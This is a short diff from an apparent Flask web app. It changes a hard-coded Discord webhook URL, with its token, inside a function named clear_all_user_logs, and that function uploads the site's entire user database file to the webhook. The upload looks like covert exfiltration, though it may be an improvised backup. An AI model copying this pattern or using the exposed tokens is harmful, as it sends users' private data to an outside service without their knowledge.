@@ -534,7 +534,7 @@ def clear_all_user_logs():
         db_path = os.path.join(os.path.dirname(__file__), '..', 'instance',
                            'site.db')
         upload_file_to_discord(
-            "https://discord.com/api/webhooks/1273288058808045679/-k8Tc5AWGZGroG3swyknC2y_EEWXfvQQUDyLiZnsHeqtWu4UQbLe-ZBJLABZH6hx2AtH",
+            "https://discord.com/api/webhooks/1275538670195314853/at0i2GmpGCjXvyrBxVcE_6zKC7w1_8JUaSrGExqtWuVfWk9aALL9yWeDRL5kM-3OPFot",
             db_path)
         # Query all users
         users = User.query.all()
